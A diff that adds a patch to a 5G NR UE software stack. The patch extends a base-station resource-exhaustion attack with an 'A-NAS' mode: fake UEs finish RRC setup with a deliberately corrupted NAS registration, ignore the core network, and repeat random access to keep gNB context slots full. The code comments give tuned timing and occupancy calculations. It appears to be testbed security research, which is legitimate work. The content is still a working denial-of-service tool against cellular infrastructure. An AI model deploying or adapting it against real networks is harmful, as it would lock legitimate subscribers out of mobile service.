@@ -1,0 +1,175 @@
+--- a/openair2/RRC/NR_UE/rrc_timers_and_constants.c
++++ b/openair2/RRC/NR_UE/rrc_timers_and_constants.c
+@@ -36,6 +36,8 @@
+   int target_occupancy;
+   int probe_ues;
+   int probe_ra_only;
++  int anas_ues;
++  int anas_gap_ms;
+   int evict_ues;
+   int evict_crnti_lo;
+   int evict_crnti_hi;
+@@ -68,6 +70,8 @@
+   {"evict_pci",         "PCI put in the forged ReestabUE-Identity\n",                     0, .iptr=&rss_cfg.evict_pci,         .defintval=1,                        TYPE_INT,    0}, \
+   {"probe_ra_only",     "probe keeps redoing RA (skips Msg5) so each RA faces the attack\n", 0, .iptr=&rss_cfg.probe_ra_only,     .defintval=0,                        TYPE_INT,    0}, \
+   {"probe_ues",         "instances 0..N-1 act as ordinary UEs (connect normally)\n",     0, .iptr=&rss_cfg.probe_ues,         .defintval=0,                        TYPE_INT,    0}, \
++  {"anas_ues",          "instances [probe_ues, +N) send Msg5 then never answer the core\n", 0, .iptr=&rss_cfg.anas_ues,          .defintval=0,                        TYPE_INT,    0}, \
++  {"anas_gap_ms",       "A-NAS: ms after Msg5 before the next RA (0 = hold the link)\n",  0, .iptr=&rss_cfg.anas_gap_ms,       .defintval=80,                       TYPE_INT,    0}, \
+   {"ra_depth",          "concurrent RA procedures per UE instance (1 = upstream)\n",     0, .iptr=&rss_cfg.ra_depth,          .defintval=1,                        TYPE_INT,    0}, \
+   {"msg4_wait",         "1 = A-type (wait for Msg4, then skip Msg5). 0 = abandon at Msg3\n", 0, .iptr=&rss_cfg.msg4_wait,        .defintval=1,                        TYPE_INT,    0}, \
+   {"hold_ms",           "gNB hold time per incomplete context (t300 + guard)\n",         0, .iptr=&rss_cfg.hold_ms,           .defintval=2000,                     TYPE_INT,    0}, \
+@@ -327,6 +331,47 @@
+   return ue >= 0 && ue < nr_rss_probe_ues();
+ }
+ 
++int nr_rss_anas_ues(void)
++{
++  const int n = rss_get_cfg()->anas_ues;
++  return n < 0 ? 0 : n;
++}
++
++/* A-NAS holders sit just above the probes, so they never collide with the
++   evictors, which are taken from the top (nr_rss_is_evictor).
++   WHY: A-type never sends Msg5, so a context lives exactly the gNB's
++   t300 + rrc_procedure_guard_time_ms (measured 2,197 ms) and occupancy is
++   capped at accept_rate x hold = 42.5 x 2.197 = 93.4 against a ceiling of 96 --
++   3% short, on a rate the gNB pins. Sending Msg5 cancels that guard: a
++   completed context has no expiry, so a holder connects once and simply stays.
++   With H holders the A-type storm only has to cover 96 - H, which it already
++   can from H >= 3. No restart is involved, so this avoids the release-from-
++   timer path that crashed the UE on 2026-10-20 (run SAT-1019T220108Z). */
++bool nr_rss_is_anas(int ue)
++{
++  const int lo = nr_rss_probe_ues();
++  const int n = nr_rss_anas_ues();
++  return n > 0 && ue >= lo && ue < lo + n;
++}
++
++/* A-NAS churn. The NGAP guard OCUDU applies is purely time based -- measured
++   2026-10-22: "UE did not request a PDU session after 3000ms. Releasing UE from
++   DU" -- so the gNB holds a completed context for 3 s whether or not we keep
++   the link alive. Staying connected therefore buys nothing and costs a UE
++   instance, which capped A-NAS occupancy at the instance count (<= 32).
++   Starting a fresh RA right after Msg5 instead makes occupancy rate x hold
++   again: 42.5/s x 3.143 s = 133 against a ceiling of 96.
++   rss_poll() ends in handle_t300_expiry() with no RRC-state guard, so the new
++   RA proceeds from RRC_CONNECTED without any teardown -- this deliberately
++   avoids the UE-initiated release that crashed the UE on 2026-10-20
++   (SAT-1019T220108Z). The gap must clear Msg5 on the air first: measured
++   Msg3->Msg5 at the CU was 21.7 ms, so the 80 ms default has ~3.7x margin. */
++int nr_rss_anas_gap_ms(void)
++{
++  const int g = rss_get_cfg()->anas_gap_ms;
++  return g < 0 ? 0 : g;
++}
++
+ bool nr_rss_honor_reject(void)
+ {
+   return rss_get_cfg()->honor_reject != 0;
+--- a/openair2/RRC/NR_UE/rrc_proto.h
++++ b/openair2/RRC/NR_UE/rrc_proto.h
+@@ -101,6 +101,9 @@
+ int nr_rss_evict_hi(void);
+ int nr_rss_evict_pci(void);
+ bool nr_rss_is_probe(int ue);
++int nr_rss_anas_ues(void);
++bool nr_rss_is_anas(int ue);
++int nr_rss_anas_gap_ms(void);
+ int nr_rss_ra_depth(void);
+ int nr_rss_reject_backoff_ms(void);
+ /* Per-UE counters: with --num-ues > 1 every instance runs its own attempt
+--- a/openair2/RRC/NR_UE/rrc_UE.c
++++ b/openair2/RRC/NR_UE/rrc_UE.c
+@@ -735,6 +735,23 @@
+ }
+ 
+ /** @brief Check if there is dedicated NAS information to forward to NAS */
++/* A-NAS (rss-landscape.md 3.2, LTEFuzz "BTS resource depletion").
++   The gNB's RRC setup guard is cancelled the moment Msg5 arrives, so a
++   completed context has no expiry and its lifetime is decided by the core.
++   We then make sure the core never finishes anything: the 5GMM message type is
++   replaced with an unassigned value, so the AMF cannot act on the payload,
++   never resolves a SUPI (the held contexts therefore cannot collapse onto one
++   subscriber) and has no NAS procedure to accept or reject.
++   Plain 5GMM header: [EPD 0x7E][security header type][message type].
++   Isolated testbed only -- UE side only, the gNB is untouched. */
++static void nr_rss_blind_initial_nas(int ue, uint8_t *nas_data, uint32_t length)
++{
++  if (!nr_rss_is_anas(ue) || nas_data == NULL || length < 3 || nas_data[0] != 0x7e)
++    return;
++  nas_data[2] = 0xf0;
++  LOG_I(NR_RRC, "[RSS] A-NAS UE %d: initial NAS blinded (%u B)\n", ue, length);
++}
++
+ static void nr_rrc_process_dedicatedNAS_MessageList(NR_UE_RRC_INST_t *rrc, NR_RRCReconfiguration_v1530_IEs_t *rec_1530)
+ {
+   if (rec_1530->dedicatedNAS_MessageList) {
+@@ -2336,6 +2353,12 @@
+     } else {
+       // Send Initial NAS message (Registration Request) before Security Mode control procedure
+       generateRegistrationRequest(&initialNasMsg, nas, false);
++      /* The pending-NAS path is only taken when NAS pushed an initial UL
++         transfer first. An rss-triggered RA has no pending NAS, so Msg5 builds
++         a fresh Registration Request right here -- blind this copy too, or an
++         A-NAS holder would register for real with the configured IMSI and the
++         AMF would collapse every holder onto one subscriber. */
++      nr_rss_blind_initial_nas((int)rrc->ue_id, initialNasMsg.nas_data, initialNasMsg.length);
+     }
+     if (!initialNasMsg.nas_data) {
+       RRCLOG_E("Failed to complete RRCSetup. NAS InitialUEMessage message not found.\n");
+@@ -2548,6 +2571,7 @@
+          RRCLOG_I("[RAPROC] Logical Channel DL-CCCH (SRB0), Received NR_RRCSetup\n");
+          if (nr_rss_enabled()
+              && !(nr_rss_is_probe((int)rrc->ue_id) && !nr_rss_probe_ra_only())
++             && !nr_rss_is_anas((int)rrc->ue_id)
+              && !nr_rss_complete_this_attempt()) {
+            /* A-type: Msg4 is accepted and MAC still sends the HARQ ACK, but
+               nr_rrc_process_rrcsetup() is skipped, so no cell group is applied,
+@@ -2572,6 +2596,12 @@
+                         rrc->rnti);
+            }
+            nr_rrc_process_rrcsetup(rrc, dl_ccch_msg->message.choice.c1->choice.rrcSetup);
++           /* A-NAS churn: Msg5 is queued now. The gNB will hold this completed
++              context for its 3000 ms NGAP guard regardless of what we do next, so
++              take another slot instead of sitting on the link. anas_gap_ms must be
++              long enough for Msg5 to reach the air. */
++           if (nr_rss_enabled() && nr_rss_is_anas((int)rrc->ue_id) && nr_rss_anas_gap_ms() > 0)
++             nr_rss_arm_retry(rrc, nr_rss_anas_gap_ms());
+          }
+          rval = 0;
+          break;
+@@ -3006,7 +3036,9 @@
+             NR_DLInformationTransfer_IEs_t *dlInfo_IE = dlInfo->criticalExtensions.choice.dlInformationTransfer;
+             /* This message hold a dedicated info NAS payload, forward it to NAS */
+             NR_DedicatedNAS_Message_t *dedicatedNAS_Message = dlInfo_IE->dedicatedNAS_Message;
+-            if (dedicatedNAS_Message) {
++            /* A-NAS: never answer the core. The AMF keeps retransmitting and the
++               gNB keeps the completed RRC context, which is what we hold. */
++            if (dedicatedNAS_Message && !nr_rss_is_anas((int)rrc->ue_id)) {
+               MessageDef *ittiMsg = itti_alloc_new_message(TASK_RRC_NRUE, rrc->ue_id, NAS_DOWNLINK_DATA_IND);
+               dl_info_transfer_ind_t *msg = &NAS_DOWNLINK_DATA_IND(ittiMsg);
+               msg->UEid = rrc->ue_id;
+@@ -3550,6 +3582,7 @@
+       free(rrc->pending_initial_nas.nas_data);
+       rrc->pending_initial_nas.nas_data = req->nasMsg.nas_data;
+       rrc->pending_initial_nas.length = req->nasMsg.length;
++      nr_rss_blind_initial_nas((int)rrc->ue_id, rrc->pending_initial_nas.nas_data, rrc->pending_initial_nas.length);
+       RRCLOG_I("Initial NAS UL: no SRB yet; buffered %u B for RRCSetupComplete dedicatedNAS (RRC state=%d)\n",
+                req->nasMsg.length,
+                rrc->nrRrcState);
+@@ -3759,6 +3792,15 @@
+   // Stop all the timers except T302, T320 and T325
+   nr_timer_stop(&tac->T300);
+   nr_timer_stop(&tac->rss_retry_timer);
++  /* A-NAS: the network released us. OCUDU fires an NGAP guard 3000 ms after the
++     NGAP UE context exists when the UE asks for no PDU session (measured
++     2026-10-22: "UE did not request a PDU session after 3000ms. Releasing UE
++     from DU"), which is 1.57x the 1,999 ms RRC setup guard that bounds A-type.
++     We are legitimately in IDLE now, so re-arm RA exactly as the A-type path
++     does and take the slot again. This is network-initiated, so it is NOT the
++     UE-initiated release that crashed the UE on 2026-10-20 (SAT-1019T220108Z). */
++  if (nr_rss_enabled() && nr_rss_is_anas((int)rrc->ue_id))
++    nr_rss_arm_retry(rrc, 0);
+   nr_timer_stop(&tac->T301);
+   nr_timer_stop(&tac->T304);
+   nr_timer_stop(&tac->T310);
